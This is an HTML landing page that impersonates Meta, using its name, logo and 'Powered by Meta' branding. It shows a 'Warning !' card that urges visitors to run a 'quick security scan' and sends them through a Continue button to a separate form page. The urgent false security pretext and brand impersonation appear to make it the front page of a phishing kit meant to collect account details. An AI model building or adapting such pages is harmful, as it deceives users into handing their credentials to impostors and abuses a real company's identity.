<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Welcome to our platform — create your account to get started." />
  <title>Meta</title>
  <link rel="icon" href="assets/meta_logo.png" type="image/png">
  <link rel="stylesheet" href="assets/style.css" />
</head>

<body>

  <!-- Landing Card -->
  <div class="card">

    <!-- Circular logo (placeholder path — replace with your actual logo) -->
    <img src="assets/meta_logo.png" alt="Company Logo" class="logo"
      onerror="this.style.background='var(--color-accent)';this.alt=''" />

    <!-- Title & Instructions -->
    <h1 class="card-title">Warning !</h1>

    <ul class="security-list">
      <li class="security-item">Keep your account safe.</li>
      <li class="security-item">We recommend a quick security scan to protect your account.</li>
      <li class="security-item">Tap Continue to proceed.</li>
    </ul>

    <!-- Primary CTA — navigates to the registration form -->
    <a href="form.html" class="btn">Continue</a>

    <!-- Footer branding -->
    <!-- <p class="powered-by">Powered by Meta</p> -->
    <img src="assets/pwdby.png" alt="Powered" class="poweredby">

  </div>

</body>

</html>
